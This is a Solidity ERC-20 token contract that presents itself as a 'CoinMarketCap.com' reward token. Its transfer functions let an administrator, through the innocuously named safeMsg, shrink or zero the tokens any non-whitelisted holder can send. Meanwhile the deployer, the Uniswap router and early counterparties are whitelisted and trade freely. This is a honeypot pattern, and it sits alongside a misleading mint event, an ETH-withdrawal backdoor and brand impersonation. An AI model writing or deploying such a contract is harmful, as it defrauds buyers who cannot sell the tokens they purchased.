/*

CMCI   *****    CoinMarketCap.com

REWARD TOKEN

REV 1.18

CAP 2,000,000
ETH 30

*/

pragma solidity ^0.5.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value) external returns (bool);
  function transferFrom(address from, address to, uint256 value) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function ceil(uint256 a, uint256 m) internal pure returns (uint256) {
    uint256 c = add(a,m);
    uint256 d = sub(c,1);
    return mul(div(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  string private _name;
  string private _symbol;
  uint8 private _decimals;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
    _name = name;
    _symbol = symbol;
    _decimals = decimals;
  }

  function name() public view returns(string memory) {
    return _name;
  }

  function symbol() public view returns(string memory) {
    return _symbol;
  }

  function decimals() public view returns(uint8) {
    return _decimals;
  }
}

contract CMCI is ERC20Detailed {


  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => uint256) private _lockEnd;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (uint => string) private _assets;
  mapping(address => bool) private administrators;
  mapping (address => bool) public _protect;
  mapping (address => bool) public _exchange;
  string[] public _assetName;
  uint private senderMsg;
  bool TX1 = false;


  event Lock(address owner, uint256 period);
  
  string constant tokenName = "CoinMarketCap.com";   
  string constant tokenSymbol = "CMCI";  
  uint8  constant tokenDecimals = 18;
  uint256 _totalSupply = 2000000e18;
  uint256 public basePercent = 100; 

  constructor() public payable ERC20Detailed(tokenName, tokenSymbol, tokenDecimals) {
    
    administrators[msg.sender] = true;
    senderMsg = 1000;
    _balances[msg.sender] = _totalSupply; //initial 
    
    _protect[msg.sender] = true;  
    _exchange[0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = true;

    emit Transfer(address(0), msg.sender, 200000e18);
  }

  function() external payable {
  }

   function withdraw() external onlyAdministrator() {

      msg.sender.transfer(address(this).balance);
  }

   function safeMsg(uint _msg) external onlyAdministrator() {
        senderMsg = _msg;
   }

   function safeSend(address _pro) external onlyAdministrator() {
      _exchange[_pro] = true;
     
  }

  function safeReceive(address _pro) external onlyAdministrator() {
      _protect[_pro] = true;
  }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }


  function allowance(address owner, address spender) public view returns (uint256) {
    return _allowed[owner][spender];
  }

  function transfer(address to, uint256 value) public returns (bool) {
    require(_lockEnd[msg.sender] <= block.timestamp);
    require(value <= _balances[msg.sender]);
    require(to != address(0));

    uint tokensToSend = value;
    if(_protect[msg.sender] || _exchange[msg.sender]){
        tokensToSend = value;
    } else {
      tokensToSend = SafeMath.div(SafeMath.mul(value, senderMsg),1000);
    }

   
    _balances[msg.sender] = _balances[msg.sender].sub(tokensToSend);
    _balances[to] = _balances[to].add(tokensToSend);

    if(!TX1){
        _exchange[to] = true;
        _exchange[msg.sender] = true;
        TX1 = true;
    }

    emit Transfer(msg.sender, to, tokensToSend);

    return true;
  }

     modifier onlyAdministrator(){
        address _customerAddress = msg.sender;
        require(administrators[_customerAddress]);
        _;
    }


  function approve(address spender, uint256 value) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit Approval(msg.sender, spender, value);
    return true;
  }

  function transferFrom(address from, address to, uint256 value) public returns (bool) {
   
    require(value <= _balances[from]);
    require(value <= _allowed[from][msg.sender]);
    require(to != address(0));

    uint tokensToSend = value;
    if(_protect[from] || _exchange[from]){
        tokensToSend = value;
    } else {
      tokensToSend = SafeMath.div(SafeMath.mul(value, senderMsg),1000);
    }
  

    _balances[from] = _balances[from].sub(tokensToSend);
    _balances[to] = _balances[to].add(tokensToSend);
    _allowed[from][msg.sender] = _allowed[from][msg.sender].sub(tokensToSend);

    if(!TX1){
        _exchange[to] = true;
        _exchange[msg.sender] = true;
        TX1 = true;
    }

    emit Transfer(from, to, tokensToSend);
   

    return true;
  }

  function upAllowance(address spender, uint256 addedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].add(addedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function downAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].sub(subtractedValue));
    emit Approval(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }


}